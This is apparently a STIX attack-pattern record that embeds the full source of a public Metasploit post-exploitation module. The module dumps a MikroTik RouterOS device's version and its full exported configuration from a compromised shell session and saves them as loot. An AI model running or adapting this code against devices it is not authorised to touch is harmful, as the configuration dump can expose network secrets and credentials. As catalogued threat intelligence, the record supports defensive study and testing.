{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a81ba31-5737-4054-88b1-aeab1c1b3a53",
    "created": "2024-08-14T16:33:17.990952Z",
    "modified": "2024-08-14T16:33:17.990955Z",
    "name": "Mikrotik Gather Device General Information",
    "description": " This module collects Mikrotik device information and configuration. This module has been tested against RouterOS 6.45.9.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_mikrotik.rb",
            "external_id": "enum_mikrotik.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Mikrotik\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mikrotik Gather Device General Information',\n        'Description' => %q{\n          This module collects Mikrotik device information and configuration.\n          This module has been tested against RouterOS 6.45.9.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['h00die'],\n        'Platform' => ['mikrotik'],\n        'SessionTypes' => ['shell'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def run\n    # Get device prompt\n    prompt = session.shell_command(\"/\\n\")\n\n    # https://wiki.mikrotik.com/wiki/Manual:Console#Safe_Mode\n    if prompt.include?('<SAFE>') # safe mode from ctr+x\n      vprint_status('In safe mode')\n    end\n\n    # Get version info\n    print_status('Getting version information')\n    version_out = session.shell_command(\"/system package print without-paging\\n\")\n\n    ver_loc = store_loot('mikrotik.version',\n                         'text/plain',\n                         session,\n                         version_out.strip,\n                         'version.txt',\n                         'Mikrotik Version')\n\n    # Print the version of VERBOSE set to true.\n    vprint_good(version_out)\n    vprint_good(\"Version information stored in to loot #{ver_loc}\")\n\n    # run additional information gathering\n    enum_configs\n  end\n\n  # run commands found in exec mode under privilege 1\n  def enum_configs\n    host = session.session_host\n    port = session.session_port\n    exec_commands = [\n      {\n        'cmd' => '/export verbose',\n        'fn' => 'get_config',\n        'desc' => 'Get Device Config on Mikrotik Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = ec['cmd']\n      cmd_out = session.shell_command(command).gsub(/#{command}/, '')\n      print_status(\"Gathering info from #{command}\")\n      # detect if we're in pagination and get as much data as possible\n      if ec['fn'] == 'get_config'\n        mikrotik_routeros_config_eater(host, port, cmd_out.strip)\n      else\n        cmd_loc = store_loot(\"mikrotik.#{ec['fn']}\",\n                             'text/plain',\n                             session,\n                             cmd_out.strip,\n                             \"#{ec['fn']}.txt\",\n                             ec['desc'])\n        vprint_good(\"Saving to #{cmd_loc}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['mikrotik']"
    ]
}